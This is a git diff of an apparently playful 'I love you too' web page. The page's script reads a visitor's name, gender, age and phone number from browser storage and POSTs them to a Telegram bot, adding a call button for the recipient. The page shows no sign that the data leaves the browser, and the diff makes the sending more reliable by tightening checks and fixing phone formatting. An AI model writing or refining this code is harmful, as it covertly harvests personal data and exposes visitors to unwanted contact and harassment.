@@ -10,39 +10,6 @@
       type="image/x-icon"
     />
     <link rel="stylesheet" href="style.css" />
-    <style>
-      body {
-        font-family: Arial, sans-serif;
-        text-align: center;
-        margin: 0;
-        padding: 0;
-        background-color: #f9f9f9;
-      }
-      .container {
-        margin-top: 50px;
-      }
-      .header img {
-        width: 150px;
-        height: auto;
-      }
-      .message {
-        margin-top: 20px;
-        font-size: 24px;
-        color: #4caf50;
-      }
-      footer {
-        margin-top: 50px;
-        font-size: 14px;
-        color: #666;
-      }
-      footer a {
-        color: #4caf50;
-        text-decoration: none;
-      }
-      footer a:hover {
-        text-decoration: underline;
-      }
-    </style>
   </head>
   <body>
     <div class="container">
@@ -65,8 +32,13 @@
       // Retrieve user data from localStorage
       const userData = JSON.parse(localStorage.getItem("userData"));
 
-      if (userData) {
-        // Display personalized message
+      if (
+        userData &&
+        userData.username &&
+        userData.gender &&
+        userData.age &&
+        userData.phone
+      ) {
         const messageElement = document.getElementById("message");
         if (messageElement) {
           messageElement.textContent = `I love you too, ${userData.username} (${userData.age} years old)!`;
@@ -74,8 +46,10 @@
           console.error("Message element not found!");
         }
 
-        // Prefix the phone number with +855
-        const formattedPhone = "+855" + userData.phone;
+        // Prefix the phone number with +855 only if it doesn't start with a country code
+        let formattedPhone = userData.phone.startsWith('+')
+          ? userData.phone
+          : '+855' + userData.phone;
 
         // Send data to Telegram bot
         const telegramBotToken =
@@ -84,45 +58,37 @@
         const message = `Informations: User \nName: ${userData.username}\nGender: ${userData.gender}\nAge: ${userData.age}\nPhone: ${formattedPhone}`;
 
         fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
-          method: "POST",
-          headers: {
-            "Content-Type": "application/json",
-          },
-          body: JSON.stringify({
-            chat_id: chatId,
-            text: message,
-            reply_markup: JSON.stringify({
-              inline_keyboard: [
-                [
-                  {
-                    text: "❤️ Love ❤️", // Clicking this button opens Telegram with the formatted phone number
-                    url: `https://t.me/${formattedPhone}`,
-                  },
-                  {
-                    text: "Call 📞", // Clicking this button initiates a phone call
-                    url: `tel:${formattedPhone}`,
-                  },
-                ],
-              ],
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json', // Use JSON content type
+            },
+            body: JSON.stringify({ // Send data as a JSON object
+                chat_id: chatId,
+                text: message,
+                reply_markup: JSON.stringify({
+                    inline_keyboard: [
+                        [
+                            {
+                                text: "Call 📞",
+                                url: `tel:${formattedPhone}`,
+                            },
+                        ],
+                    ],
+                }),
             }),
-            parse_mode: "HTML",
-            disable_web_page_preview: true,
-            disable_notification: false,
-          }),
         })
           .then((response) => {
-            if (!response.ok) {
-              return response.json().then((errorData) => {
-                throw new Error(`Telegram API error: ${errorData.description}`);
-              });
-            }
-            console.log("Message sent successfully to Telegram bot.");
+              if (!response.ok) {
+                  return response.json().then((errorData) => {
+                      throw new Error(`Telegram API error: ${errorData.description}`);
+                  });
+              }
+              console.log("Message sent successfully to Telegram bot.");
           })
           .catch((error) => {
-            console.error("Error sending message to Telegram bot:", error);
+              console.error("Error sending message to Telegram bot:", error);
           });
       } else {
-        // Handle case where no user data is found
         const messageElement = document.getElementById("message");
         if (messageElement) {
           messageElement.textContent =
